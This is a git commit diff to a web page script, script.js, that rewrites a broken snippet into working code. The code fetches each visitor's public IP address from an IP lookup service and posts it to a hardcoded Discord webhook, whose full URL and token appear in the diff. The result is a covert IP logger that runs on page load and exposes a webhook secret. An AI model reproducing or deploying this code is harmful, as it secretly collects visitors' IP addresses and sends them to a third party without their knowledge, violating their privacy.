87ca1d5fb1d631a95a3060c57a181fe33bcc563a
EphRex <128737077+EphRex@users.noreply.github.com>
2024-06-02 20:13:17 +0100

    Update script.js

--- script.js
+++ script.js
@@ -1,13 +1,21 @@
-const whurl = "https://discord.com/api/webhooks/1246559249325097052/UzuMt97coTW1187qKif_WXZnHvLg4n-1C_M0NsBYtP2OBDDVv5RbZy3IZZMh33lzagkB"
-var getIP = function(json) {
-      document.getElementById("IP").innerHTML = json.ip;
-    }
-const msg = {
-    "content": "ip - ${IP}"
-}
+const whurl = "https://discord.com/api/webhooks/1246559249325097052/UzuMt97coTW1187qKif_WXZnHvLg4n-1C_M0NsBYtP2OBDDVv5RbZy3IZZMh33lzagkB";
 
-fetch(whurl + "?wait=true", 
-{"method":"POST", 
-"headers": {"content-type": "application/json"},
-"body": JSON.stringify(msg)})
-.then(a=xa.json()).then(console.log)
+fetch("https://api.ipify.org?format=json")
+    .then(response => response.json())
+    .then(json => {
+        const ip = json.ip;
+        document.getElementById("IP").innerHTML = ip;
+
+        const msg = {
+            "content": `ip - ${ip}`
+        };
+
+        return fetch(whurl + "?wait=true", {
+            "method": "POST",
+            "headers": {"content-type": "application/json"},
+            "body": JSON.stringify(msg)
+        });
+    })
+    .then(response => response.json())
+    .then(console.log)
+    .catch(console.error);
